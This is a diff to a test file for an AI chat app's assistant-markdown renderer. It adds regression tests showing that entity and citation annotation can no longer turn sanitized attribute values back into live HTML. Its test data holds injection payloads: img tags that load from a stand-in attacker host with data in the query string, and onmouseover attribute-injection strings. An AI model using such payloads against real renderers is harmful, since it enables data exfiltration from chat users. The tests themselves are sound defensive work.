@@ -1,6 +1,7 @@
 /**
  * End-to-end assistant markdown rendering (ChatMessages.renderAssistantMarkdown):
- * markdown → marked → sanitizer → entity/reference annotation.
+ * markdown → marked → sanitizer, with the entity/reference annotation running
+ * INSIDE the sanitizer, on its inert DOM, before the image pass (#428).
  *
  * The assistant's markdown carries tool-result content verbatim (mail bodies,
  * document text), so these cases feed markup through the whole pipeline and
@@ -13,7 +14,7 @@
  */
 import { describe, it, expect } from 'vitest'
 import type { RetrievalReference } from '@hames-ai/harness-patterns/patterns/retriever.server'
-import { escapeHtmlAttribute } from '~/lib/sanitize-html'
+import { sanitizeMarkdownHtml } from '~/lib/sanitize-html'
 
 const { renderAssistantMarkdown } = await import('~/components/ark-ui/ChatMessages')
 
@@ -136,8 +137,9 @@ describe('renderAssistantMarkdown — a remote image in the answer does not load
     expect(host.innerHTML).not.toMatch(/(src|srcset|style)="[^"]*attacker/)
   })
 
-  it('survives entity annotation, which runs after the sanitizer', () => {
-    // The annotators rewrite text segments; the placeholder's text is one.
+  it('survives entity annotation, which runs before the image pass', () => {
+    // The annotators wrap text nodes of the sanitized DOM. The image pass runs
+    // after them, so nothing they do can bring an image back.
     const host = mount(
       renderAssistantMarkdown(`Acme results ![x](${exfil})`, new Map([['Acme', ['n1']]]), []),
     )
@@ -219,22 +221,19 @@ describe('renderAssistantMarkdown — annotation spans', () => {
     expect(attributeNames(host)).not.toContain('onmouseover')
   })
 
-  // The filename is interpolated into the citation `title`. marked escapes
-  // quotes in text, so a quote-bearing filename no longer matches its own
-  // mention and the span is usually not emitted at all — the escaping is what
-  // holds if that ever changes. The docId and entity-id cases above are the
-  // directly reachable ones; this pins the value, not just the outcome.
-  it('escapes a quote in a filename before it reaches the citation title', () => {
+  // The filename lands in the citation `title`. It used to be escaped into an
+  // interpolated string; since #428 the annotator sets the attribute through
+  // the DOM, so there is no escaper left to pin. What holds either way, and is
+  // pinned here, is the outcome: the value arrives verbatim, as one attribute.
+  it('carries a quote in a filename into the citation title as a value, not markup', () => {
     const source = 'q1" onmouseover="window.stolen=1" x="report.pdf'
     const host = mount(
       renderAssistantMarkdown(`Summary of ${source} attached.`, noEntities, [reference(source)]),
     )
 
+    expect(host.querySelector('.doc-ref')?.getAttribute('title')).toBe(`Open ${source} in viewer`)
     expect(attributeNames(host)).not.toContain('onmouseover')
     expect(attributeNames(host)).not.toContain('x')
-    expect(escapeHtmlAttribute(source)).toBe(
-      'q1&quot; onmouseover=&quot;window.stolen=1&quot; x=&quot;report.pdf',
-    )
   })
 
   it('escapes quotes in entity ids instead of letting them open a new attribute', () => {
@@ -245,5 +244,205 @@ describe('renderAssistantMarkdown — annotation spans', () => {
       'n1" onmouseover="window.stolen=1',
     )
     expect(attributeNames(host)).not.toContain('onmouseover')
+  })
+})
+
+// ============================================================================
+// #428: annotation must never re-parse the sanitized HTML
+// ============================================================================
+//
+// The annotators used to run on the sanitizer's SERIALIZED output. They split
+// it with `/(<[^>]+>)/` and rewrote the "text" pieces, which assumes no `>`
+// inside an attribute value. jsdom (this layer) serializes `<` and `>` in
+// attribute values raw. So a `>` in a title or alt made the tail of the
+// attribute look like text, and the annotator's own `"` then closed the
+// attribute. Whatever the sanitizer had judged an attribute STRING came back
+// as live markup: an `<img>` the image pass never saw, and an anchor that lost
+// the `target`/`rel` the link rule stamps. Current Chromium, WebKit and
+// Firefox escape both characters there. Older engines do not.
+//
+// Each payload below is asserted three ways, all through the DOM:
+//   - no element loads the attacker host;
+//   - every link still carries the link rule's `target` and `rel`;
+//   - with the annotation spans unwrapped, the fragment is EXACTLY what the
+//     sanitizer produced for the same answer with nothing to annotate. In
+//     other words, annotation wrapped text and changed nothing else.
+
+const ATTACKER = 'attacker.example'
+const STASH_IMAGE = '/api/stash/document/doc-1?sessionId=s1&download'
+const acme = new Map<string, string[]>([['Acme', ['n1']]])
+
+/** The fragment with every annotation span unwrapped and its mark removed. */
+const withoutAnnotations = (host: HTMLElement): string => {
+  host.querySelectorAll('sup.doc-ref-mark').forEach((mark) => mark.remove())
+  host
+    .querySelectorAll('span.graph-entity, span.doc-ref')
+    .forEach((span) => span.replaceWith(...span.childNodes))
+  return host.innerHTML
+}
+
+/** Every element in the fragment whose `src` would fetch from the attacker. */
+const attackerLoads = (host: HTMLElement): string[] =>
+  [...host.querySelectorAll('[src]')]
+    .filter((el) => el.getAttribute('src')!.includes(ATTACKER))
+    .map((el) => el.outerHTML)
+
+describe('renderAssistantMarkdown: annotation cannot turn an attribute back into markup (#428)', () => {
+  it('runs where the hazard is real: jsdom still leaves `>` raw in an attribute value', () => {
+    // Positive control. The payloads below discriminate only while this holds.
+    // If a jsdom upgrade starts escaping `>` here, a restored regex split
+    // would pass them, so delete or replace them then. The decoded-text cases
+    // in the next block do not depend on the serializer and keep
+    // discriminating.
+    expect(sanitizeMarkdownHtml('<span title="a>b">x</span>')).toContain('title="a>b"')
+  })
+
+  const payloads: Array<[string, string, Map<string, string[]>, RetrievalReference[]]> = [
+    [
+      'the issue payload: a link title holding `>` and an entity name',
+      `[ok](https://ok.test/ "x>Acme <img src=https://${ATTACKER}/p.png?d=S>")`,
+      acme,
+      [],
+    ],
+    [
+      'the same through a cited filename',
+      `[ok](https://ok.test/ "x>report.pdf <img src=https://${ATTACKER}/p.png?d=S>")`,
+      noEntities,
+      [reference('report.pdf')],
+    ],
+    [
+      'alt text on an allowed stash image',
+      `![x>Acme <img src=https://${ATTACKER}/p.png?d=S>](${STASH_IMAGE})`,
+      acme,
+      [],
+    ],
+    [
+      'a raw element other than a link, holding `>` in its title',
+      `<span title="x>Acme <img src=//${ATTACKER}/s.png>">y</span>`,
+      acme,
+      [],
+    ],
+    [
+      'entity-encoded tags in a markdown title',
+      `[ok](https://ok.test/ "x&gt;Acme &lt;img src=https://${ATTACKER}/p.png?d=S&gt;")`,
+      acme,
+      [],
+    ],
+    [
+      'entity-encoded tags in a raw anchor title, decimal and hex',
+      `<a href="https://ok.test/" title="x&gt;Acme &#60;img src=//${ATTACKER}/p.png&#x3e;">ok</a>`,
+      acme,
+      [],
+    ],
+    [
+      'a tag opened before a citation chip and closed by the anchor after it',
+      `[ok](https://ok.test/ "x>report.pdf <img src=//${ATTACKER}/p.png?d=S")`,
+      noEntities,
+      [reference('report.pdf')],
+    ],
+    [
+      'a tag opened before an entity span and closed by the anchor after it',
+      `[ok](https://ok.test/ "x>Acme <img src=//${ATTACKER}/p.png?d=S")`,
+      acme,
+      [],
+    ],
+    [
+      'nested quotes in a single-quoted raw title',
+      `<a href="https://ok.test/" title='x>Acme "y" <img src=//${ATTACKER}/q.png>'>ok</a>`,
+      acme,
+      [],
+    ],
+    [
+      'nested quotes in a markdown title',
+      `[ok](https://ok.test/ 'x>Acme "y" <img src=//${ATTACKER}/q.png>')`,
+      acme,
+      [],
+    ],
+    [
+      'both annotators inside one attribute',
+      `[ok](https://ok.test/ "x>Acme report.pdf <img src=//${ATTACKER}/b.png>")`,
+      acme,
+      [reference('report.pdf')],
+    ],
+  ]
+
+  it.each(payloads)('%s', (_label, md, entities, references) => {
+    const host = mount(renderAssistantMarkdown(md, entities, references))
+    const plain = mount(renderAssistantMarkdown(md, noEntities, [])).innerHTML
+
+    expect(attackerLoads(host)).toEqual([])
+    for (const a of host.querySelectorAll('a')) {
+      expect(a.getAttribute('target')).toBe('_blank')
+      expect(a.getAttribute('rel')).toBe('noopener noreferrer')
+    }
+    expect(withoutAnnotations(host)).toBe(plain)
+  })
+
+  it('still annotates the prose beside a hostile attribute', () => {
+    const host = mount(
+      renderAssistantMarkdown(
+        `Acme and report.pdf: [ok](https://ok.test/ "x>Acme report.pdf <img src=//${ATTACKER}/b.png>")`,
+        acme,
+        [reference('report.pdf')],
+      ),
+    )
+
+    // One of each, both in the paragraph's own text, none inside the anchor.
+    expect([...host.querySelectorAll('.graph-entity')].map((s) => s.textContent)).toEqual(['Acme'])
+    expect([...host.querySelectorAll('.doc-ref')].map((s) => s.textContent)).toEqual(['report.pdf'])
+    expect(host.querySelector('a .graph-entity, a .doc-ref')).toBeNull()
+    expect(host.querySelector('a')!.getAttribute('title')).toBe(
+      `x>Acme report.pdf <img src=//${ATTACKER}/b.png>`,
+    )
+  })
+})
+
+describe('renderAssistantMarkdown: annotation reads the text the reader sees (#428)', () => {
+  // These do not depend on how jsdom serializes attributes. A pass over the
+  // serialized string sees `&lt;` and `&amp;` where the reader sees `<` and
+  // `&`, so it splits character references and misses names that contain one.
+
+  it('does not split a character reference that spells an entity name', () => {
+    const host = mount(
+      renderAssistantMarkdown(
+        `if a &lt;img src=//${ATTACKER}/x&gt; b then lt wins`,
+        new Map([
+          ['lt', ['n1']],
+          ['gt', ['n2']],
+        ]),
+        [],
+      ),
+    )
+
+    expect(host.textContent).toBe(`if a <img src=//${ATTACKER}/x> b then lt wins`)
+    expect([...host.querySelectorAll('.graph-entity')].map((s) => s.textContent)).toEqual(['lt'])
+    expect(host.querySelector('img')).toBeNull()
+  })
+
+  it('annotates a name that contains an ampersand', () => {
+    const host = mount(renderAssistantMarkdown('AT&T reported.', new Map([['AT&T', ['n1']]]), []))
+
+    expect(host.querySelector('.graph-entity')?.getAttribute('data-entity-name')).toBe('AT&T')
+    expect(host.textContent).toBe('AT&T reported.')
+  })
+
+  it('leaves the text of a refused image alone: the placeholder is built after annotation', () => {
+    const host = mount(
+      renderAssistantMarkdown(`Acme: ![c](https://${ATTACKER}/Acme.png)`, acme, []),
+    )
+
+    expect(host.querySelector('.blocked-image')?.textContent).toBe(
+      `Image blocked: https://${ATTACKER}/Acme.png`,
+    )
+    expect(host.querySelector('.blocked-image .graph-entity')).toBeNull()
+    expect(host.querySelectorAll('.graph-entity')).toHaveLength(1)
+  })
+
+  it('skips code spans and code blocks, as before', () => {
+    const host = mount(renderAssistantMarkdown('Acme `Acme` and\n\n```\nAcme\n```', acme, []))
+
+    expect(
+      [...host.querySelectorAll('.graph-entity')].map((s) => s.parentElement!.nodeName),
+    ).toEqual(['P'])
   })
 })
